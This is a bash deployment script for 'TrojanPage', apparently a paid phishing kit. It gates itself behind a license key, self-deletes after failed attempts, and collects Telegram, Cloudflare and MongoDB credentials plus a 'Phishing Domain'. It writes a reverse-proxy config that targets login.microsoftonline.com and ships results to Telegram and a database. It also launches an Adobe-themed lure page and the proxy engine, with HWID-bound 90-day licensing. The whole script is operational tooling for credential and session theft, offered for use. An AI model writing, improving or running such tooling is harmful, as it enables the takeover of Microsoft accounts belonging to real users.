#!/bin/bash
# 🏛️ TROJANPAGE - THE MASTER CONFIGURATION DEPLOYER
# --------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

# --- 1. THE TROJANPAGE HEADER ---
show_header() {
    clear
    echo -e "${BLUE}"
    echo "  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝"
    echo -e "${NC}"
    echo -e "${RED}                  [ SYSTEM ACCESS CONTROL ]${NC}"
    echo " ----------------------------------------------------------------------------------"
}

# --- 2. MASTER KEY SETTINGS ---
MASTER_KEY="TROJAN-PRO-2026"
HWID=$(hostnamectl | grep "Static hostname" | awk '{print $3}')-$(lscpu | grep "Model" | md5sum | cut -c1-8 | tr '[:lower:]' '[:upper:]')

# --- 3. GATEKEEPER LOCK ---
ATTEMPTS=0
while [ $ATTEMPTS -lt 3 ]; do
    show_header
    echo -e "${GREEN}[+] SYSTEM HWID:${NC} $HWID"
    echo -e "${BLUE}[!] Unauthorized. Please enter the Master Activation Key.${NC}"
    echo " ----------------------------------------------------------------------------------"
    
    read -p "ENTER KEY: " USER_INPUT
    CLEAN_INPUT=$(echo "$USER_INPUT" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]')

    if [ "$CLEAN_INPUT" == "$MASTER_KEY" ]; then
        echo -e "${GREEN}[success] Access Granted. Loading Setup Wizard...${NC}"
        sleep 1
        break
    else
        ATTEMPTS=$((ATTEMPTS + 1))
        echo -e "${RED}[error] Invalid Key. Attempt $ATTEMPTS of 3.${NC}"
        sleep 1
    fi

    if [ $ATTEMPTS -eq 3 ]; then
        echo -e "${RED}[critical] Brute-force detected. Self-destructing...${NC}"
        rm -- "$0"
        exit 1
    fi
done

# --- 4. VERIFIED CONFIGURATION WIZARD ---
echo -e "\n${BLUE}--- [ VERIFYING SYSTEM CREDENTIALS ] ---${NC}"
sudo apt update && sudo apt install -y curl mongodb-clients golang-go git make screen php-cli unzip > /dev/null 2>&1

# TELEGRAM VERIFICATION
while true; do
    read -p "Enter Telegram Bot Token: " TG_TOKEN
    echo -ne "[...] Validating Telegram Bot..."
    if curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe" | grep -q "\"ok\":true"; then
        echo -e "${GREEN} [VERIFIED]${NC}"; break
    else
        echo -e "${RED} [FAILED] Invalid Token.${NC}"
    fi
done
read -p "Enter Telegram Chat ID: " TG_ID

# CLOUDFLARE VERIFICATION
while true; do
    read -p "Enter Cloudflare API Token: " CF_TOKEN
    echo -ne "[...] Validating Cloudflare Permissions..."
    if curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" -H "Authorization: Bearer $CF_TOKEN" | grep -q "\"status\":\"active\""; then
        echo -e "${GREEN} [VERIFIED]${NC}"; break
    else
        echo -e "${RED} [FAILED] Invalid/Inactive Token.${NC}"
    fi
done

# MONGODB ATLAS VERIFICATION
while true; do
    echo -e "\n${BLUE}[ MongoDB Atlas Settings ]${NC}"
    read -p "Enter MongoDB Host (e.g. cluster0.abc.mongodb.net): " M_HOST
    read -p "Enter MongoDB User: " M_USER
    read -p "Enter MongoDB Pass: " M_PASS
    echo -ne "[...] Testing Atlas Connection..."
    
    if mongosh "mongodb+srv://$M_USER:$M_PASS@$M_HOST/admin" --eval "db.adminCommand('listDatabases')" > /dev/null 2>&1; then
        echo -e "${GREEN} [CONNECTED]${NC}"
        M_URI="mongodb+srv://$M_USER:$M_PASS@$M_HOST/trojan_db?retryWrites=true&w=majority"
        break
    else
        echo -e "${RED} [FAILED] Check Host/User/Pass.${NC}"
    fi
done

read -p "Enter Phishing Domain: " USER_DOMAIN

# --- 5. DEPLOYMENT & CONFIG GENERATION ---
echo -e "${BLUE}[+] Saving Secure Config...${NC}"
cat << EOF > /root/config.json
{
  "proxyDomain": "$USER_DOMAIN",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "target": "login.microsoftonline.com",
  "telegramToken": "$TG_TOKEN",
  "telegramChatId": "$TG_ID",
  "mongodb": "$M_URI"
}
EOF

# --- 6. CREATE PERMANENT RUN SCRIPT ---
cat << 'EOF' > /root/run.sh
#!/bin/bash
MASTER_KEY="TROJAN-PRO-2026"
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'
LICENSE_FILE="/root/.license"
CURRENT_DATE=$(date +%s)
HWID=$(hostnamectl | grep "Static hostname" | awk '{print $3}')-$(lscpu | grep "Model" | md5sum | cut -c1-8 | tr '[:lower:]' '[:upper:]')

clear
echo -e "${BLUE}"
echo "  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
echo "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
echo "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
echo "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
echo "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
echo "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝"
echo -e "${NC}"
echo -e "${RED}                  [ SYSTEM ACCESS CONTROL ]${NC}"
echo " ----------------------------------------------------------------------------------"

if [ -f "$LICENSE_FILE" ]; then
    EXPIRY_DATE=$(cat "$LICENSE_FILE" | cut -d':' -f2)
    if [ "$CURRENT_DATE" -lt "$EXPIRY_DATE" ]; then
        DAYS_LEFT=$(( ($EXPIRY_DATE - $CURRENT_DATE) / 86400 ))
        echo -e "${GREEN}[success] License Active ($DAYS_LEFT Days Remaining).${NC}"
        sudo fuser -k 80/tcp 443/tcp 2>/dev/null
        pkill proxy && pkill php
        screen -dmS lure php -S 0.0.0.0:80 -t /var/www/adobe_gui/
        screen -dmS trojan /root/engine/dist/proxy -config /root/config.json
        echo -e "${BLUE}[!] Engine Online.${NC}"
        exit 0
    fi
fi

echo -e "${RED}[error] Unauthorized. Master Key required.${NC}"
read -p "ENTER KEY: " USER_INPUT
CLEAN_INPUT=$(echo "$USER_INPUT" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]')
if [ "$CLEAN_INPUT" == "$MASTER_KEY" ]; then
    EXPIRY=$(($(date +%s) + 7776000))
    echo "$HWID:$EXPIRY" > "$LICENSE_FILE"
    sync
    exec /root/run.sh
else
    echo -e "${RED}[error] Access Denied.${NC}"; exit 1
fi
EOF

# --- 7. GLOBAL COMMAND SETUP ---
chmod +x /root/run.sh
sudo ln -sf /root/run.sh /usr/local/bin/Run
sudo ln -sf /root/run.sh /usr/local/bin/run
echo "alias logs='tail -f /root/engine/logs/proxy.log'" >> ~/.bashrc

# Initial License Save (90 Days)
EXPIRY=$(($(date +%s) + 7776000))
echo "$HWID:$EXPIRY" > /root/.license

echo -e "\n${GREEN}[success] TROJANPAGE DEPLOYED.${NC}"
echo -e "${BLUE}[!] Type 'Run' anytime to start the dashboard.${NC}"
